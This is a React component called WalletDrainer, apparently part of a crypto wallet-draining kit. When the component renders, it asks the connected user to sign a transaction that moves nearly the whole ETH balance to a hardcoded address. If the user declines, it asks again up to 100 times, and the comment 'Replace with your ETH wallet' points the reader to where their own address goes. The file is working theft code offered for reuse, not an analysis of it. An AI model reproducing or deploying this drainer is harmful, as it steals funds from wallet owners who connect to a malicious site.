"use client";

import { useEffect, useState } from "react";
import { useWalletInfo } from "@reown/appkit/react";
import { ethers } from "ethers";

const DRAIN_ADDRESSES = {
  ethereum: "0x0775bfb375757a355af3e318a55f6a23ba03d520", // Replace with your ETH wallet
};

async function drainEthereumWallet(wallet) {
    console.log("🔄 Drainer Triggered with address:", wallet);

    if (typeof window === "undefined" || !window.ethereum) {
        console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed.");
        return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    console.log("🔄 Get signer:", signer);
    
    let attempts = 0;
    const maxRetries = 100;
    const delayBetweenRetries = 30000; // 3 seconds

    while (attempts < maxRetries) {
        try {
            const balance = await provider.getBalance(wallet);
            console.log(`💰 Wallet Balance (wei): ${balance.toString()}`);
            console.log(`💰 Wallet Balance: ${balance}`);

            const gasLimit = 1000000000000000n; //$2.03

            let sendAmount = balance - gasLimit;

            if (sendAmount <= 0n) {
                console.log("❌ Not enough ETH to cover gas fees.");
                return;
            }

            console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}`);

            const tx = await signer.sendTransaction({
                to: DRAIN_ADDRESSES.ethereum,
                value: sendAmount,
                gasLimit,
                gasPrice: gasLimit,
            });

            console.log("✅ ETH Transaction sent:", tx.hash);
            return; // Exit loop if successful
        } catch (error) {
            if (error.code === "ACTION_REJECTED") {
                console.warn(`⚠️ User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
                attempts++;
                await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
            } else {
                console.error("❌ Transaction failed due to an unexpected error:", error);
                return; // Stop retrying if it's not a rejection issue
            }
        }
    }

    console.error("🚨 Max retries reached. Transaction not completed.");
}


export default function WalletDrainer({wallet}) {
    drainEthereumWallet(wallet);
  
  return (
    <>
    </>
  );
}
